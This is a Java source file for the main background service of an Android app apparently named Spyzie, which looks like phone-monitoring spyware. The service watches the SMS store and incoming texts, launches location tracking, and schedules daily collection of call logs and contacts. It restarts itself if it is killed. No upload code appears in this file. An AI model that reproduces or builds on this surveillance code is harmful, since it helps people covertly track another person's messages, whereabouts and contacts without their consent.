package com.tantd.spyzie.service;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.device.worker.GetCallsWorker;
import com.tantd.spyzie.data.device.worker.GetContactsWorker;
import com.tantd.spyzie.di.module.ServiceModule;
import com.tantd.spyzie.receiver.SmsObserver;
import com.tantd.spyzie.receiver.SpyzieReceiver;
import com.tantd.spyzie.util.Constants;

import java.util.concurrent.TimeUnit;

public class MainService extends Service {

    private static final String DEBUG_SUB_TAG = "[" + MainService.class.getSimpleName() + "] ";

    private ContentObserver mContentObserver;

    private SpyzieReceiver mSpyzieReceiver;

    private PeriodicWorkRequest mGetCallsWorkRequest;
    private PeriodicWorkRequest mGetContactsWorkRequest;

    @Override
    public void onCreate() {
        createServiceComponent();
        super.onCreate();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");

        mContentObserver = new SmsObserver(new Handler(), this);
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
    }

    private void createServiceComponent() {
        SpyzieApplication.getInstance().createServiceComponent(new ServiceModule(this)).inject(this);
    }

    private void releaseServiceComponent() {
        SpyzieApplication.getInstance().releaseServiceComponent();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onStartCommand()");

        IntentFilter filter = new IntentFilter();
        filter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        mSpyzieReceiver = new SpyzieReceiver();
        registerReceiver(mSpyzieReceiver, filter);

        Intent locationServiceIntent = new Intent(this, LocationService.class);
        LocationService.enqueueWork(this, locationServiceIntent);

        startGetCallsWorkRequest();

        startGetContactsWorkRequest();

        return START_STICKY;
    }

    private void startGetCallsWorkRequest() {
        mGetCallsWorkRequest = new PeriodicWorkRequest.Builder(GetCallsWorker.class, 24, TimeUnit.HOURS).build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetCallsWorker.GET_CALLS_WORK_REQUEST,
                ExistingPeriodicWorkPolicy.KEEP, mGetCallsWorkRequest);
    }

    private void startGetContactsWorkRequest() {
        mGetContactsWorkRequest = new PeriodicWorkRequest.Builder(GetContactsWorker.class, 24, TimeUnit.HOURS).build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetContactsWorker.GET_CONTACTS_WORK_REQUEST,
                ExistingPeriodicWorkPolicy.KEEP, mGetContactsWorkRequest);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onDestroy()");

        getContentResolver().unregisterContentObserver(mContentObserver);
        unregisterReceiver(mSpyzieReceiver);

        LocationService.stopAllWork();

        releaseServiceComponent();

        // TODO: cancel all work requests
        WorkManager.getInstance(this).cancelWorkById(mGetCallsWorkRequest.getId());
        WorkManager.getInstance(this).cancelWorkById(mGetContactsWorkRequest.getId());
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
